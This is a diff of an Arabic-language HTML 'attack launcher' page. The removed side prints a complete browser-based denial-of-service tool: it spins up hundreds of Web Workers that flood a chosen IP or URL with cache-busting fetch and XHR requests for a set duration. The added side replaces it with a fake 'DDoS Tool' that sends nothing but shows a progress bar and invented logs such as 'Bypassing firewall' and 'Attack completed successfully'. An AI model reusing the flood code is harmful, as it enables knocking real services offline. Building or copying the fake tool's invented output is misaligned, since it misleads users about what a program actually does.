@@ -1,122 +1,259 @@
 <!DOCTYPE html>
-<html dir="rtl">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>هجوم - مشغل هجمات</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DDoS Tool - Purple Edition</title>
     <style>
-        body { background: #0a0a0a; color: #0f0; font-family: Arial; text-align: center; padding: 20px; }
-        input, select, button { background: #1a1a1a; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 5px; font-size: 16px; border-radius: 5px; }
-        button { background: #0a0; cursor: pointer; font-weight: bold; }
-        button:hover { background: #0f0; color: #000; }
-        #log { background: #000; border: 1px solid #0f0; height: 300px; overflow-y: scroll; text-align: left; padding: 10px; font-size: 12px; margin-top: 10px; }
-        .red { color: #f00; }
-        .green { color: #0f0; }
+        
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        body {
+            background-color: #0f0518; 
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        
+        .bg-glow {
+            position: absolute;
+            width: 300px;
+            height: 300px;
+            background: radial-gradient(circle, rgba(138, 43, 226, 0.4) 0%, rgba(0,0,0,0) 70%);
+            top: -50px;
+            left: -50px;
+            z-index: 0;
+            animation: pulse 4s infinite alternate;
+        }
+
+        .bg-glow-2 {
+            position: absolute;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(75, 0, 130, 0.3) 0%, rgba(0,0,0,0) 70%);
+            bottom: -100px;
+            right: -100px;
+            z-index: 0;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.5; }
+            100% { transform: scale(1.2); opacity: 0.8; }
+        }
+
+        
+        .container {
+            background: rgba(25, 10, 40, 0.85);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(138, 43, 226, 0.5);
+            padding: 40px;
+            border-radius: 20px;
+            width: 400px;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(138, 43, 226, 0.2), inset 0 0 20px rgba(138, 43, 226, 0.1);
+            z-index: 10;
+            position: relative;
+        }
+
+        h1 {
+            color: #d4a5ff;
+            margin-bottom: 20px;
+            font-weight: 900;
+            text-shadow: 0 0 10px #8a2be2;
+            letter-spacing: 1px;
+        }
+
+        label {
+            display: block;
+            text-align: right;
+            margin-bottom: 8px;
+            color: #bfaaff;
+            font-size: 0.9rem;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 20px;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid #5e2a84;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            border-color: #bf55ff;
+            box-shadow: 0 0 10px rgba(191, 85, 255, 0.4);
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #8a2be2, #9932cc);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(138, 43, 226, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(138, 43, 226, 0.6);
+            background: linear-gradient(45deg, #9932cc, #ba55ff);
+        }
+
+        button:active {
+            transform: translateY(1px);
+        }
+
+        
+        .status-bar {
+            margin-top: 20px;
+            height: 6px;
+            background: #1a0b2e;
+            border-radius: 10px;
+            overflow: hidden;
+            display: none;
+        }
+
+        .progress {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #8a2be2, #ff00ff);
+            box-shadow: 0 0 10px #ff00ff;
+            transition: width 0.1s linear;
+        }
+
+        .log-area {
+            margin-top: 15px;
+            height: 80px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 5px;
+            padding: 10px;
+            text-align: left;
+            font-family: monospace;
+            font-size: 0.8rem;
+            color: #00ffaa;
+            overflow-y: auto;
+            direction: ltr;
+            border: 1px solid #333;
+        }
+
+        .ip-display {
+            margin-top: 10px;
+            font-size: 0.8rem;
+            color: #aaa;
+        }
     </style>
 </head>
 <body>
-    <h1>🔥 مشغل الهجمات 🔥</h1>
-    <select id="mode">
-        <option value="ip">هجوم على IP</option>
-        <option value="url">هجوم على URL</option>
-    </select>
-    <input type="text" id="target" placeholder="الهدف: IP:PORT أو URL">
-    <input type="number" id="duration" value="30" placeholder="المدة (ثواني)" min="1">
-    <input type="number" id="threads" value="500" placeholder="عدد الثريدات" min="10" max="2000">
-    <button onclick="startAttack()">🚀 ابدأ الهجوم</button>
-    <button onclick="stopAttack()" class="red">⛔ إيقاف</button>
-    <div id="status"></div>
-    <div id="log"></div>
+
+    <div class="bg-glow"></div>
+    <div class="bg-glow-2"></div>
+
+    <div class="container">
+        <h1>⚡ DDoS Attack ⚡</h1>
+        
+        <label for="targetInput">أدخل الرابط أو الـ IP</label>
+        <input type="text" id="targetInput" placeholder="example.com or 1.1.1.1">
+        
+        <button onclick="startAttack()">بدء الهجوم</button>
+
+        <div class="status-bar" id="statusBar">
+            <div class="progress" id="progressBar"></div>
+        </div>
+        
+        <div class="log-area" id="logs"></div>
+        <div class="ip-display" id="ipDisplay"></div>
+    </div>
 
     <script>
-        let running = false;
-        let workers = [];
+        let isAttacking = false;
 
-        function log(msg, color = 'green') {
-            const div = document.getElementById('log');
-            div.innerHTML += `<span style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</span><br>`;
-            div.scrollTop = div.scrollHeight;
+        function log(msg) {
+            const logs = document.getElementById('logs');
+            const p = document.createElement('p');
+            p.innerText = `> ${msg}`;
+            logs.appendChild(p);
+            logs.scrollTop = logs.scrollHeight;
         }
 
         function startAttack() {
-            if (running) { log('الهجوم شغال بالفعل!', 'red'); return; }
+            if (isAttacking) return;
             
-            const mode = document.getElementById('mode').value;
-            const target = document.getElementById('target').value;
-            const duration = parseInt(document.getElementById('duration').value);
-            const threadCount = parseInt(document.getElementById('threads').value);
-
-            if (!target) { log('حط هدف أولاً!', 'red'); return; }
-
-            running = true;
-            document.getElementById('status').innerHTML = `🚀 الهجوم شغال على ${target} - ${threadCount} ثريد - ${duration} ثانية`;
-            log(`بدء الهجوم على ${target} بـ ${threadCount} ثريد`, 'green');
-
-           
-            for (let i = 0; i < threadCount; i++) {
-                const worker = new Worker(URL.createObjectURL(new Blob([`
-                    self.onmessage = function(e) {
-                        const { mode, target, duration, workerId } = e.data;
-                        const end = Date.now() + (duration * 1000);
-                        
-                        while (Date.now() < end) {
-                            try {
-                                if (mode === 'ip') {
-                                
-                                    const [ip, port] = target.split(':');
-                                    fetch('http://' + target + '/?' + Math.random(), {
-                                        mode: 'no-cors',
-                                        cache: 'no-store',
-                                        keepalive: true
-                                    }).catch(() => {});
-                                    
-                                  
-                                    fetch('https://' + target + '/?' + Math.random(), {
-                                        mode: 'no-cors',
-                                        cache: 'no-store',
-                                        keepalive: true
-                                    }).catch(() => {});
-                                } else {
-                                    
-                                    fetch(target + '?' + Math.random(), {
-                                        mode: 'no-cors',
-                                        cache: 'no-store',
-                                        keepalive: true,
-                                        headers: {
-                                            'User-Agent': ['Mozilla/5.0', 'Chrome/120', 'Safari/537.36'][Math.floor(Math.random()*3)]
-                                        }
-                                    }).catch(() => {});
-                                    
-                                 
-                                    const xhr = new XMLHttpRequest();
-                                    xhr.open('GET', target + '?x=' + Math.random(), true);
-                                    xhr.send();
-                                }
-                            } catch(e) {}
-                        }
-                        self.postMessage('done');
-                    };
-                `], { type: 'application/javascript' })));
-
-                worker.onmessage = function() {
-                    workers = workers.filter(w => w !== worker);
-                };
-
-                worker.postMessage({ mode, target, duration, workerId: i });
-                workers.push(worker);
+            const target = document.getElementById('targetInput').value.trim();
+            if (!target) {
+                alert("الرجاء إدخال الرابط أو الـ IP أولاً");
+                return;
             }
 
-       
-            setTimeout(() => {
-                if (running) stopAttack();
-            }, duration * 1000);
-        }
+   
+            document.getElementById('logs').innerHTML = '';
+            document.getElementById('statusBar').style.display = 'block';
+            document.getElementById('ipDisplay').innerText = `Target: ${target}`;
+            
+            isAttacking = true;
+            const btn = document.querySelector('button');
+            btn.innerText = "جاري الهجوم...";
+            btn.style.background = "#333";
+            
+            let progress = 0;
+            const bar = document.getElementById('progressBar');
+            
+     
+            const interval = setInterval(() => {
+                progress += Math.random() * 5;
+                if (progress > 100) progress = 100;
+                
+                bar.style.width = progress + '%';
+                
+                const actions = [
+                    "Sending SYN packets...",
+                    "UDP Flood initiated...",
+                    "Bypassing firewall...",
+                    "Connecting to proxy network...",
+                    "Payload sent: " + Math.floor(Math.random() * 9999) + "KB",
+                    "Requesting handshake..."
+                ];
+                
+                if (Math.random() > 0.7) {
+                    log(actions[Math.floor(Math.random() * actions.length)]);
+                }
 
-        function stopAttack() {
-            running = false;
-            workers.forEach(w => w.terminate());
-            workers = [];
-            document.getElementById('status').innerHTML = '⛔ الهجوم متوقف';
-            log('تم إيقاف الهجوم', 'red');
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    isAttacking = false;
+                    btn.innerText = "انتهى الهجوم ✅";
+                    log("Attack completed successfully!");
+                    
+                    setTimeout(() => {
+                        btn.style.background = "linear-gradient(45deg, #8a2be2, #9932cc)";
+                        document.getElementById('statusBar').style.display = 'none';
+                        bar.style.width = '0%';
+                    }, 3000);
+                }
+            }, 100);
         }
     </script>
 </body>
